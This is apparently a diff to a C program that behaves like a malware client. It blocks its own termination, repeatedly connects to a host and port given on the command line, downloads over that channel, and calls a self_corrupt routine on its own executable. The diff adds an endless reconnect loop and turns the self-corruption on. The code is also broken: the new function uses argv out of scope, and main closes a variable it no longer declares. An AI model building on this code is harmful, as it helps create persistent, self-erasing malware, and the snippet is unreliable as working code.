@@ -31,20 +31,28 @@
 #include "console.h"
 #include "channel.h"
 
+void repeater()
+{
+    for (;;) {
+        int channel = channel_open(argv[1], atoi(argv[2]));
+        if (channel < 0)
+            continue;
+
+        
+    }
+}
+
 int main(int argc, char *argv[])
 {
     if (argc == 3) {
-        int channel = channel_open(argv[1], atoi(argv[2]));
-        if (channel < 0)
-            return -1;
-
         prevent_termination();
-        //prevent_reboot();
-        
-        channel_download(channel, "test");
+        /* prevent_reboot(); */
 
-        //self_corrupt(argv[0]);
+        repeater();
+
+        self_corrupt(argv[0]);
         channel_close(channel);
     }
+
     return 0;
 }
